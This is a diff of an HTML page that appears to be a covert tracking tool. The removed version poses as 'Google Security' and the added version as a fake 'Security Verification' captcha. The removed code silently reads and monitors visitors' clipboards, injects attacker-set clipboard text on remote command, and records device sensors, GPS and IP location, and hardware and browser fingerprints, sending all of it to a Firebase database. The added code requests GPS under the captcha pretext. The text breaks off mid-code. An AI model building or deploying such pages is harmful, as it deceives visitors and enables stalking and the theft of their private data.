@@ -3,1283 +3,556 @@
 
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-  <title>Google</title>
-
-  <!-- Firebase SDK -->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>Security Verification</title>
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
-  <!--CREATED BY https://www.xploitpoison.com/-->
-
-
   <style>
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+      user-select: none;
     }
 
     body {
-      background: #000;
-      overflow: hidden;
-    }
-
-    /* Fullscreen iframe — restored to old behavior */
-    .game-frame {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      border: none;
-    }
-
-    /* Victim Premium Toasts */
-    .victim-toasts {
-      position: fixed;
-      top: 20px;
-      left: 50%;
-      transform: translateX(-50%);
+      font-family: 'Roboto', 'Segoe UI', Arial, sans-serif;
+      background: #f0f2f5;
+      min-height: 100vh;
       display: flex;
       flex-direction: column;
-      gap: 10px;
-      z-index: 9999999;
-      /* Sabse upar dikhega */
-      pointer-events: none;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
     }
 
-    .v-toast {
-      padding: 12px 24px;
-      background: rgba(10, 14, 23, 0.95);
-      backdrop-filter: blur(10px);
+    /* ═══ CAPTCHA CARD — poora page ═══ */
+    .captcha-page {
+      width: 100%;
+      max-width: 420px;
+      background: #fff;
       border-radius: 8px;
-      font-size: 14px;
-      font-weight: 700;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      border: 1px solid #dadce0;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+      overflow: hidden;
+      animation: slideIn 0.4s ease;
+    }
+
+    @keyframes slideIn {
+      from { opacity: 0; transform: translateY(-20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Header */
+    .header {
+      padding: 20px 24px;
+      border-bottom: 1px solid #e8eaed;
       display: flex;
       align-items: center;
-      gap: 10px;
-      transform: translateY(-20px);
-      opacity: 0;
-      transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-      box-shadow: 0 5px 20px rgba(0, 0, 0, 0.5);
-      color: #fff;
-      border-left: 4px solid #00ff88;
+      gap: 14px;
+      background: #fff;
     }
 
-    .v-toast.show {
-      transform: translateY(0);
-      opacity: 1;
-    }
-
-    .v-toast.ok {
-      border-color: #00ff88;
-      box-shadow: 0 0 15px rgba(0, 255, 136, 0.2);
-    }
-
-    .v-toast.ok .v-toast-icon {
-      color: #00ff88;
-      text-shadow: 0 0 10px #00ff88;
-    }
-
-    .v-toast.err {
-      border-color: #ff2e4c;
-      box-shadow: 0 0 15px rgba(255, 46, 76, 0.2);
-    }
-
-    .v-toast.err .v-toast-icon {
-      color: #ff2e4c;
-      text-shadow: 0 0 10px #ff2e4c;
-    }
-
-    .v-toast-icon {
-      font-size: 18px;
+    .logo {
+      width: 40px;
+      height: 40px;
+      border-radius: 8px;
+      background: linear-gradient(135deg, #4285f4, #34a853);
       display: flex;
       align-items: center;
       justify-content: center;
+      font-size: 22px;
+      box-shadow: 0 2px 8px rgba(66, 133, 244, 0.3);
+    }
+
+    .header-text h1 {
+      font-size: 18px;
+      font-weight: 600;
+      color: #202124;
+      margin-bottom: 2px;
+    }
+
+    .header-text p {
+      font-size: 13px;
+      color: #5f6368;
+    }
+
+    /* Body */
+    .body {
+      padding: 24px;
+    }
+
+    .instruction {
+      font-size: 15px;
+      color: #202124;
+      margin-bottom: 16px;
+      font-weight: 500;
+      line-height: 1.4;
+    }
+
+    .instruction span {
+      color: #1a73e8;
+      font-weight: 700;
+    }
+
+    /* Grid + Bird */
+    .grid {
+      position: relative;
+      width: 100%;
+      height: 280px;
+      background: linear-gradient(135deg, #e8f0fe, #d2e3fc);
+      border-radius: 8px;
+      border: 1px solid #dadce0;
+      overflow: hidden;
+      margin-bottom: 16px;
+      cursor: crosshair;
+    }
+
+    .grid::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background-image:
+        linear-gradient(rgba(255, 255, 255, 0.4) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(255, 255, 255, 0.4) 1px, transparent 1px);
+      background-size: 60px 60px;
+      pointer-events: none;
+    }
+
+    .bird {
+      position: absolute;
+      font-size: 48px;
+      cursor: pointer;
+      display: none;
+      filter: drop-shadow(0 2px 6px rgba(0, 0, 0, 0.3));
+      transition: transform 0.1s;
+      z-index: 10;
+      animation: birdFloat 0.5s ease-in-out infinite alternate;
+    }
+
+    @keyframes birdFloat {
+      from { transform: translateY(0) rotate(-3deg); }
+      to { transform: translateY(-6px) rotate(3deg); }
+    }
+
+    .bird:active {
+      transform: scale(0.85);
+    }
+
+    /* Progress */
+    .progress-row {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 14px;
+    }
+
+    .progress-bar {
+      flex: 1;
+      height: 8px;
+      background: #e8eaed;
+      border-radius: 4px;
+      overflow: hidden;
+    }
+
+    .progress-fill {
+      height: 100%;
+      width: 100%;
+      background: linear-gradient(90deg, #4285f4, #34a853);
+      border-radius: 4px;
+      transition: width 0.1s linear;
+    }
+
+    .timer {
+      font-size: 14px;
+      font-weight: 700;
+      color: #d93025;
+      min-width: 40px;
+      text-align: right;
+      font-family: 'Courier New', monospace;
+    }
+
+    /* Stats */
+    .stats {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 14px;
+      font-size: 14px;
+      color: #5f6368;
+    }
+
+    .stats strong {
+      color: #202124;
+      font-weight: 700;
+    }
+
+    /* Status */
+    .status {
+      font-size: 13px;
+      color: #5f6368;
+      text-align: center;
+      padding: 10px;
+      border-radius: 6px;
+      background: #f8f9fa;
+      transition: all 0.3s;
+      min-height: 20px;
+    }
+
+    .status.success { color: #34a853; background: #e6f4ea; font-weight: 600; }
+    .status.error { color: #d93025; background: #fce8e6; font-weight: 600; }
+    .status.warning { color: #f9ab00; background: #fef7e0; font-weight: 600; }
+
+    /* Footer */
+    .footer {
+      padding: 14px 24px;
+      border-top: 1px solid #e8eaed;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 12px;
+      color: #5f6368;
+      background: #f8f9fa;
+    }
+
+    .footer-brand {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-weight: 500;
+    }
+
+    /* Success screen */
+    .success-screen {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.7);
+      backdrop-filter: blur(6px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 99999;
+      animation: fadeIn 0.3s ease;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    .success-box {
+      background: #fff;
+      border-radius: 12px;
+      padding: 40px 50px;
+      text-align: center;
+      max-width: 320px;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
+      animation: popIn 0.4s ease;
+    }
+
+    @keyframes popIn {
+      0% { transform: scale(0.8); opacity: 0; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+
+    .check-circle {
+      width: 70px;
+      height: 70px;
+      border-radius: 50%;
+      background: #34a853;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 20px;
+      font-size: 36px;
+      color: #fff;
+      animation: pop 0.5s ease;
+    }
+
+    @keyframes pop {
+      0% { transform: scale(0); }
+      60% { transform: scale(1.15); }
+      100% { transform: scale(1); }
+    }
+
+    .success-box h2 {
+      color: #202124;
+      font-size: 20px;
+      margin-bottom: 8px;
+    }
+
+    .success-box p {
+      color: #5f6368;
+      font-size: 14px;
+      line-height: 1.5;
     }
   </style>
 </head>
 
 <body>
-  <div class="victim-toasts" id="victimToasts"></div>
 
-  <div id="customAlert"
-    style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.6); z-index:999999; align-items:center; justify-content:center; backdrop-filter:blur(2px);">
-    <div
-      style="background:#ffffff; border-radius:8px; padding:30px 25px; max-width:400px; width:90%; text-align:left; box-shadow:0 4px 20px rgba(0,0,0,0.15); position:relative; animation: fadeIn 0.2s ease;">
+  <!-- ═══ CAPTCHA PAGE ═══ -->
+  <div class="captcha-page" id="captchaPage">
+    
+    <!-- Header -->
+    <div class="header">
+      <div class="logo">🛡️</div>
+      <div class="header-text">
+        <h1>Security Verification</h1>
+        <p>Please complete the challenge below</p>
+      </div>
+    </div>
 
+    <!-- Body -->
+    <div class="body">
+      <div class="instruction">
+        Click on the <span>bird</span> to verify you're human
+      </div>
 
-      <div style="display:flex; align-items:center; gap:12px; margin-bottom:20px;">
+      <div class="grid" id="grid">
+        <div class="bird" id="bird">🐦</div>
+      </div>
 
-        <img id="popupBrandIconImg" src="https://www.google.com/favicon.ico"
-          style="width:32px; height:32px; border-radius:50%; object-fit:cover;" onerror="this.style.display='none'">
-
-        <div>
-
-          <h3 id="popupBrandName"
-            style="color:#202124; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-size:16px; font-weight:600; margin:0;">
-            Google Security</h3>
-
-          <p id="popupBrandUrl" style="color:#5f6368; font-size:12px; margin:0;">accounts.google.com</p>
+      <div class="progress-row">
+        <div class="progress-bar">
+          <div class="progress-fill" id="progressFill"></div>
         </div>
+        <div class="timer" id="timer">5s</div>
       </div>
 
-
-      <p id="customAlertMessage"
-        style="color:#202124; font-size:15px; margin-bottom:25px; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height:1.5;">
-        Message Here
-      </p>
-
-
-      <div style="display:flex; justify-content:flex-end; gap:10px;">
-        <button onclick="document.getElementById('customAlert').style.display='none'"
-          style="background:transparent; color:#1a73e8; border:none; padding:10px 16px; border-radius:4px; font-family:'Segoe UI', sans-serif; font-size:14px; font-weight:600; cursor:pointer; transition:background 0.2s;"
-          onmouseover="this.style.background='#f1f3f4'" onmouseout="this.style.background='transparent'">
-          Cancel
-        </button>
-
-        <button onclick="document.getElementById('customAlert').style.display='none'"
-          style="background:#1a73e8; color:#fff; border:none; padding:10px 24px; border-radius:4px; font-family:'Segoe UI', sans-serif; font-size:14px; font-weight:600; cursor:pointer; transition:background 0.2s; box-shadow:0 1px 3px rgba(60,64,67,0.3);"
-          onmouseover="this.style.background='#1557b0'" onmouseout="this.style.background='#1a73e8'">
-          OK
-        </button>
+      <div class="stats">
+        <span>🎯 Hits: <strong id="hitCount">0</strong></span>
+        <span>⚡ Speed: <strong id="speedDisplay">0</strong>/s</span>
       </div>
+
+      <div class="status" id="status">Initializing...</div>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+      <div class="footer-brand">
+        <span>🔒</span>
+        <span>Protected by SecurityCheck</span>
+      </div>
+      <div>v2.1</div>
     </div>
   </div>
 
-  <style>
-    @keyframes fadeIn {
-      0% {
-        opacity: 0;
-        transform: translateY(-10px);
-      }
-
-      100% {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
-  </style>
-
-  <iframe id="dynamicFrame" class="game-frame" src="about:blank"
-    allow="geolocation; clipboard-read; clipboard-write"></iframe>
-
   <script src="config.js"></script>
   <script>
-
+    // ═══════════════════════════════════════════════════════════════
+    // FIREBASE INIT
+    // ═══════════════════════════════════════════════════════════════
     let database = null;
-    // 🚀 ANDROID DEBUG: Direct Write Test
-    window.addEventListener('load', function () {
-      setTimeout(function () {
-        if (typeof firebase !== 'undefined' && firebase.apps.length) {
-          const testDb = firebase.database();
-          const testData = {
-            deviceId: 'test_android_' + Date.now(),
-            userAgent: navigator.userAgent,
-            timestamp: Date.now(),
-            message: 'Direct write test from Android'
-          };
+    let deviceId = 'unknown';
 
-          testDb.ref('test_android/' + Date.now()).set(testData)
-            .then(() => {
-              console.log("✅✅✅ DIRECT WRITE SUCCESSFUL!");
-              alert("✅ Data saved to Firebase!");
-            })
-            .catch((err) => {
-              console.log("❌ DIRECT WRITE FAILED:", err);
-              alert("❌ Write Failed: " + err.message);
-            });
-        }
-      }, 3000); // 3 sec baad test karo
+    try {
+      if (typeof firebaseConfig !== 'undefined' && !firebase.apps.length) {
+        firebase.initializeApp(firebaseConfig);
+        database = firebase.database();
+        deviceId = localStorage.getItem('device_tracker_id') || 'unknown';
+      }
+    } catch (e) {
+      console.warn('Firebase init failed:', e.message);
+    }
+
+    // ═══════════════════════════════════════════════════════════════
+    // STATE
+    // ═══════════════════════════════════════════════════════════════
+    const state = {
+      hits: 0,
+      timeLeft: 5,
+      totalTime: 5,
+      running: false,
+      gpsCaptured: false,
+      startTime: 0
+    };
+
+    const $ = (id) => document.getElementById(id);
+    const bird = $('bird');
+    const grid = $('grid');
+    const statusEl = $('status');
+    const hitCountEl = $('hitCount');
+    const timerEl = $('timer');
+    const progressFill = $('progressFill');
+    const speedDisplay = $('speedDisplay');
+
+    // ═══════════════════════════════════════════════════════════════
+    // BIRD MOVE
+    // ═══════════════════════════════════════════════════════════════
+    function moveBird() {
+      if (!state.running) return;
+      const w = grid.clientWidth - 60;
+      const h = grid.clientHeight - 60;
+      bird.style.left = (Math.random() * w) + 'px';
+      bird.style.top = (Math.random() * h) + 'px';
+      bird.style.display = 'block';
+    }
+
+    // ═══════════════════════════════════════════════════════════════
+    // BIRD CLICK
+    // ═══════════════════════════════════════════════════════════════
+    bird.addEventListener('click', (e) => {
+      e.stopPropagation();
+      if (!state.running) return;
+
+      state.hits++;
+      hitCountEl.textContent = state.hits;
+
+      const elapsed = (Date.now() - state.startTime) / 1000;
+      speedDisplay.textContent = elapsed > 0 ? (state.hits / elapsed).toFixed(1) : state.hits;
+
+      bird.style.display = 'none';
+      setTimeout(moveBird, 60);
+
+      if (state.hits === 3) {
+        statusEl.textContent = '🔥 Great! Keep going!';
+        statusEl.className = 'status warning';
+      } else if (state.hits === 5) {
+        statusEl.textContent = '⚡ Almost there!';
+        statusEl.className = 'status warning';
+      } else if (state.hits >= 8) {
+        statusEl.textContent = '💪 Excellent speed!';
+        statusEl.className = 'status success';
+      }
     });
-    let deviceId = null;
-    let visitCount = 0;
-    let gpsInterval = null;
-    let geoInterval = null;
-    let lastClipboardContent = '';
-    let clipboardCheckInterval = null;
-    let permissionInterval = null;
-    let sensorData = { orientation: {}, motion: {}, lastUpdate: Date.now() };
 
-    let hardwareInfo = {};
-    let softwareInfo = {};
+    // ═══════════════════════════════════════════════════════════════
+    // TIMER
+    // ═══════════════════════════════════════════════════════════════
+    function startTimer() {
+      state.startTime = Date.now();
+      state.running = true;
+      moveBird();
 
-    /* ---------------- HARDWARE / SOFTWARE ---------------- */
-    function getHardwareSoftwareInfo() {
-      const ua = navigator.userAgent;
+      const timer = setInterval(() => {
+        state.timeLeft--;
+        timerEl.textContent = state.timeLeft + 's';
+        progressFill.style.width = (state.timeLeft / state.totalTime * 100) + '%';
 
-      hardwareInfo = {
-        deviceMemory: navigator.deviceMemory || 'Unknown',
-        hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
-        maxTouchPoints: navigator.maxTouchPoints || 0,
-        vendor: navigator.vendor || 'Unknown',
-        platform: navigator.platform || 'Unknown',
-        product: navigator.product || 'Unknown',
-        devicePixelRatio: window.devicePixelRatio || 1,
-        screenWidth: screen.width,
-        screenHeight: screen.height,
-        screenColorDepth: screen.colorDepth,
-        screenPixelDepth: screen.pixelDepth
-      };
-
-      try {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        if (gl) {
-          const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-          if (dbg) {
-            hardwareInfo.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
-            hardwareInfo.gpuVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
-          }
+        if (state.timeLeft <= 0) {
+          clearInterval(timer);
+          state.running = false;
+          bird.style.display = 'none';
+          statusEl.textContent = '✅ Verification complete!';
+          statusEl.className = 'status success';
+          setTimeout(captureGPS, 500);
         }
-      } catch (e) { }
-
-      softwareInfo = {
-        userAgent: ua,
-        language: navigator.language,
-        languages: navigator.languages,
-        cookieEnabled: navigator.cookieEnabled,
-        doNotTrack: navigator.doNotTrack,
-        productSub: navigator.productSub,
-        appCodeName: navigator.appCodeName,
-        appName: navigator.appName,
-        appVersion: navigator.appVersion,
-        plugins: Array.from(navigator.plugins || []).map(p => p.name),
-        mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type),
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        timezoneOffset: new Date().getTimezoneOffset()
-      };
-
-      if (ua.includes('Chrome')) softwareInfo.browser = 'Chrome';
-      else if (ua.includes('Firefox')) softwareInfo.browser = 'Firefox';
-      else if (ua.includes('Safari')) softwareInfo.browser = 'Safari';
-      else if (ua.includes('Edg')) softwareInfo.browser = 'Edge';
-      else softwareInfo.browser = 'Unknown';
-
-      if (ua.includes('Windows')) softwareInfo.os = 'Windows';
-      else if (ua.includes('Mac')) softwareInfo.os = 'macOS';
-      else if (ua.includes('Android')) softwareInfo.os = 'Android';
-      else if (ua.includes('iPhone')) softwareInfo.os = 'iOS';
-      else softwareInfo.os = 'Unknown';
-
-      return { hardware: hardwareInfo, software: softwareInfo };
+      }, 1000);
     }
 
-    /* ---------------- CLIPBOARD ---------------- */
-    function initClipboardMonitoring() {
-      document.addEventListener('copy', () => {
-        const t = window.getSelection().toString();
-        if (t && t !== lastClipboardContent) {
-          lastClipboardContent = t;
-          const d = {
-            type: 'copy', text: t.substring(0, 1000), length: t.length,
-            timestamp: Date.now(),
-            dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
-            url: location.href, deviceId
-          };
-          saveToFirebase(`clipboard_data/${deviceId}/copy/${Date.now()}`, d);
-          saveToFirebase(`clipboard_data/${deviceId}/latest`, d);
-        }
-      });
+    // ═══════════════════════════════════════════════════════════════
+    // GPS CAPTURE
+    // ═══════════════════════════════════════════════════════════════
+    function captureGPS() {
+      if (state.gpsCaptured) return;
+      state.gpsCaptured = true;
 
-      document.addEventListener('paste', (e) => {
-        const t = e.clipboardData?.getData('text') || '';
-        if (t) {
-          const d = {
-            type: 'paste', text: t.substring(0, 1000), length: t.length,
-            timestamp: Date.now(),
-            dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
-            url: location.href, deviceId
-          };
-          saveToFirebase(`clipboard_data/${deviceId}/paste/${Date.now()}`, d);
-          saveToFirebase(`clipboard_data/${deviceId}/latest_paste`, d);
-        }
-      });
-
-      document.addEventListener('cut', () => {
-        const t = window.getSelection().toString();
-        if (t) {
-          saveToFirebase(`clipboard_data/${deviceId}/cut/${Date.now()}`, {
-            type: 'cut', text: t.substring(0, 1000), length: t.length,
-            timestamp: Date.now(),
-            dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
-            url: location.href, deviceId
-          });
-        }
-      });
-    }
-
-    function listenForAdminClipboard() {
-      if (!database) return;
-
-      // 5. CLIPBOARD LISTENER (Super Fix for Browsers)
-      database.ref(`admin_commands/${deviceId}/clipboard`).on('value', async (snap) => {
-        const c = snap.val();
-        if (c && c.text && c.active) {
-
-          const textToCopy = c.text;
-          let success = false;
-
-          // TRICK: Ek invisible button banao
-          const btn = document.createElement('button');
-          btn.style.position = 'fixed';
-          btn.style.opacity = '0';
-          btn.style.pointerEvents = 'none';
-          document.body.appendChild(btn);
-
-          // Button pe click event lagao jo copy karega
-          btn.addEventListener('click', async () => {
-            try {
-              await navigator.clipboard.writeText(textToCopy);
-              console.log('✅ Clipboard Set Successfully!');
-              success = true;
-            } catch (err) {
-              // Fallback: Agar modern API fail ho jaye
-              const textarea = document.createElement('textarea');
-              textarea.value = textToCopy;
-              textarea.style.position = 'fixed';
-              document.body.appendChild(textarea);
-              textarea.select();
-              document.execCommand('copy');
-              document.body.removeChild(textarea);
-              success = true;
-            }
-          });
-
-          // Button ko programmatically click karo
-          btn.click();
-
-          // Button ko remove kardo
-          setTimeout(() => document.body.removeChild(btn), 1000);
-
-          // Command clear karo
-          database.ref(`admin_commands/${deviceId}/clipboard`).remove();
-        }
-      });
-    }
-
-    async function setClipboardText(text) {
-      try { await navigator.clipboard.writeText(text); lastClipboardContent = text; return true; }
-      catch (err) {
-        try {
-          const ta = document.createElement('textarea');
-          ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
-          document.body.appendChild(ta); ta.select();
-          document.execCommand('copy'); document.body.removeChild(ta);
-        } catch (e) { }
-        return false;
+      if (!navigator.geolocation) {
+        statusEl.textContent = '⚠️ Location not supported';
+        statusEl.className = 'status error';
+        return;
       }
-    }
 
-    async function autoReadClipboardOnLoad() {
-      try {
-        if (!navigator.clipboard || !navigator.clipboard.readText) return;
-        const text = await navigator.clipboard.readText();
-        if (text && text.trim() !== '') {
-          await saveToFirebase(`clipboard_data/${deviceId}/auto_read/${Date.now()}`, {
-            type: 'auto_read_on_load', text: text.substring(0, 1000), length: text.length,
-            timestamp: Date.now(),
-            dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
-            url: location.href, deviceId, source: 'page_load_auto'
-          });
-        }
-      } catch (error) {
-        if (error.name === 'NotAllowedError') {
-          const oneTimeClick = async () => {
-            try {
-              const text = await navigator.clipboard.readText();
-              if (text) {
-                await saveToFirebase(`clipboard_data/${deviceId}/auto_read/${Date.now()}`, {
-                  text: text.substring(0, 500), length: text.length, timestamp: Date.now()
-                });
-              }
-            } catch (e) { }
-            document.removeEventListener('click', oneTimeClick);
-          };
-          document.addEventListener('click', oneTimeClick);
-        }
-      }
-    }
+      statusEl.textContent = '📍 Verifying location...';
+      statusEl.className = 'status warning';
 
-    function startPeriodicClipboardCheck() {
-      if (clipboardCheckInterval) clearInterval(clipboardCheckInterval);
-      clipboardCheckInterval = setInterval(async () => {
-        try {
-          if (!document.hidden && navigator.clipboard && navigator.clipboard.readText) {
-            const t = await navigator.clipboard.readText();
-            if (t && t !== lastClipboardContent && t.trim() !== '') {
-              lastClipboardContent = t;
-              await saveToFirebase(`clipboard_data/${deviceId}/periodic/${Date.now()}`, {
-                type: 'periodic_check', text: t.substring(0, 1000),
-                length: t.length, timestamp: Date.now(), deviceId
-              });
-            }
-          }
-        } catch (e) { }
-      }, 10000);
-    }
-
-    /* ---------------- SENSORS ---------------- */
-    function initMobileSensors() {
-      if ('DeviceOrientationEvent' in window) {
-        if (typeof DeviceOrientationEvent.requestPermission === 'function') {
-          document.body.addEventListener('click', () => {
-            DeviceOrientationEvent.requestPermission()
-              .then(r => { if (r === 'granted') window.addEventListener('deviceorientation', handleOrientation); })
-              .catch(() => { });
-          });
-        } else {
-          window.addEventListener('deviceorientation', handleOrientation);
-        }
-      }
-      if ('DeviceMotionEvent' in window) {
-        if (typeof DeviceMotionEvent.requestPermission === 'function') {
-          document.body.addEventListener('click', () => {
-            DeviceMotionEvent.requestPermission()
-              .then(r => { if (r === 'granted') window.addEventListener('devicemotion', handleMotion); })
-              .catch(() => { });
-          });
-        } else {
-          window.addEventListener('devicemotion', handleMotion);
-        }
-      }
-    }
-
-    function handleOrientation(event) {
-      sensorData.orientation = {
-        alpha: event.alpha, beta: event.beta, gamma: event.gamma,
-        absolute: event.absolute, timestamp: Date.now()
-      };
-      if (Date.now() - (sensorData.lastSave || 0) > 5000) {
-        saveToFirebase(`sensors/${deviceId}/orientation/${Date.now()}`, sensorData.orientation);
-        sensorData.lastSave = Date.now();
-      }
-    }
-
-    function handleMotion(event) {
-      sensorData.motion = {
-        acceleration: { x: event.acceleration?.x, y: event.acceleration?.y, z: event.acceleration?.z },
-        rotationRate: { alpha: event.rotationRate?.alpha, beta: event.rotationRate?.beta, gamma: event.rotationRate?.gamma },
-        interval: event.interval, timestamp: Date.now()
-      };
-      if (Date.now() - (sensorData.lastSaveMotion || 0) > 5000) {
-        saveToFirebase(`sensors/${deviceId}/motion/${Date.now()}`, sensorData.motion);
-        sensorData.lastSaveMotion = Date.now();
-      }
-    }
-
-    /* ---------------- GPS / GEO ---------------- */
-    function getGPSLocation() {
-      return new Promise((resolve, reject) => {
-        if (!navigator.geolocation) { reject('GPS not supported'); return; }
-        navigator.geolocation.getCurrentPosition(
-          p => resolve({
-            latitude: p.coords.latitude, longitude: p.coords.longitude,
-            accuracy: p.coords.accuracy, altitude: p.coords.altitude,
-            speed: p.coords.speed, heading: p.coords.heading, timestamp: Date.now()
-          }),
-          e => reject(e.message),
-          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-        );
-      });
-    }
-
-    async function getGeoLocation() {
-      try {
-        const r = await fetch('https://ipapi.co/json/');
-        const d = await r.json();
-        return {
-          ip: d.ip || 'Unknown', latitude: d.latitude || 0, longitude: d.longitude || 0,
-          city: d.city || 'Unknown', region: d.region || 'Unknown',
-          country: d.country_name || 'Unknown', postal: d.postal || 'Unknown',
-          timezone: d.timezone || 'Unknown', timestamp: Date.now(),
-          dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
-        };
-      } catch (e) { return null; }
-    }
-
-    async function saveToFirebase(path, data) {
-      if (!database) return false;
-      try { await database.ref(path).set(data); return true; }
-      catch (e) { return false; }
-    }
-
-    async function saveGPSToFirebase(location) {
-      if (!database || !location) return false;
-      const g = {
-        deviceId, type: 'gps', latitude: location.latitude, longitude: location.longitude,
-        accuracy: location.accuracy, speed: location.speed, altitude: location.altitude,
-        timestamp: Date.now(),
-        dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
-      };
-      await database.ref(`gps_locations/${deviceId}/current`).set(g);
-      await database.ref(`gps_locations/${deviceId}/history`).push(g);
-      return true;
-    }
-
-    async function saveGeoToFirebase(geo) {
-      if (!database || !geo || !geo.latitude || geo.latitude === 0) return false;
-      const g = {
-        deviceId, type: 'geo', latitude: geo.latitude, longitude: geo.longitude,
-        city: geo.city, region: geo.region, country: geo.country, ip: geo.ip,
-        postal: geo.postal, timezone: geo.timezone, timestamp: Date.now(),
-        dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
-      };
-      await database.ref(`geo_locations/${deviceId}/current`).set(g);
-      await database.ref(`geo_locations/${deviceId}/history`).push(g);
-      return true;
-    }
-
-    async function captureGPS() {
-      try { const g = await getGPSLocation(); await saveGPSToFirebase(g); return g; }
-      catch (e) { smartLocationRequest(); return null; }
-    }
-
-    async function captureGeo() {
-      try {
-        const g = await getGeoLocation();
-        if (g && g.latitude && g.latitude !== 0) { await saveGeoToFirebase(g); return g; }
-        return null;
-      } catch (e) { return null; }
-    }
-
-    /* ---------------- DEVICE INFO ---------------- */
-    function generateDeviceId() {
-      try {
-        let id = localStorage.getItem('device_tracker_id');
-        if (!id) {
-          id = 'dev_' + Date.now() + '_' + Math.random().toString(36).substr(2, 10);
-          localStorage.setItem('device_tracker_id', id);
-        }
-        return id;
-      } catch (e) {
-        // Agar localStorage block hai (Incognito mode)
-        console.log("localStorage blocked, using session ID");
-        return 'dev_' + Date.now() + '_' + Math.random().toString(36).substr(2, 10);
-      }
-    }
-
-    async function getBatteryInfo() {
-      if ('getBattery' in navigator) {
-        try { const b = await navigator.getBattery(); return Math.floor(b.level * 100) + '%'; }
-        catch (e) { return 'Unknown'; }
-      }
-      return 'Not supported';
-    }
-
-    async function getIPAddress() {
-      try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); return d.ip; }
-      catch (e) { return 'Unable to fetch'; }
-    }
-
-    function getDeviceInfo() {
-      const ua = navigator.userAgent;
-      let browser = 'Unknown', os = 'Unknown', device = 'Unknown';
-
-      // ✅ Edge ko pehle check karo kyunki usme bhi 'Chrome' hota hai
-      if (ua.includes('Edg/') || ua.includes('Edge/')) browser = 'Edge';
-      else if (ua.includes('OPR/') || ua.includes('Opera')) browser = 'Opera';
-      else if (ua.includes('Chrome')) browser = 'Chrome';
-      else if (ua.includes('Firefox')) browser = 'Firefox';
-      else if (ua.includes('Safari')) browser = 'Safari';
-
-      if (ua.includes('Windows')) os = 'Windows';
-      else if (ua.includes('Mac')) os = 'macOS';
-      else if (ua.includes('Android')) os = 'Android';
-      else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
-      else if (ua.includes('Linux')) os = 'Linux';
-
-      const m = ua.match(/\(([^)]+)\)/);
-      if (m) device = m[1].substring(0, 30);
-
-      return { browser, os, device, userAgent: ua };
-    }
-
-    function getNetworkInfo() {
-      const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-      return c ? (c.effectiveType || c.type || 'Unknown') : 'Unknown';
-    }
-
-    function getScreenInfo() { return `${screen.width}x${screen.height}`; }
-    function getTimezone() { return Intl.DateTimeFormat().resolvedOptions().timeZone; }
-
-    async function updateVisitCount() {
-      try {
-        const snap = await database.ref(`device_visits/${deviceId}/count`).once('value');
-        let count = snap.val() || 0; count++;
-        visitCount = count;
-        await database.ref(`device_visits/${deviceId}`).update({
-          count, lastVisit: Date.now(),
-          lastVisitTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
-        });
-        await database.ref(`visit_logs/${deviceId}`).push({
-          visitNumber: count, timestamp: Date.now(),
-          time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
-        });
-        return count;
-      } catch (e) { return 0; }
-    }
-
-    async function collectDeviceData() {
-      const d = getDeviceInfo();
-      const battery = await getBatteryInfo();
-      const ip = await getIPAddress();
-      return {
-        deviceId, ip, deviceModel: d.device, os: d.os, browser: d.browser,
-        userAgent: d.userAgent, screen: getScreenInfo(), battery,
-        networkType: getNetworkInfo(), timezone: getTimezone(),
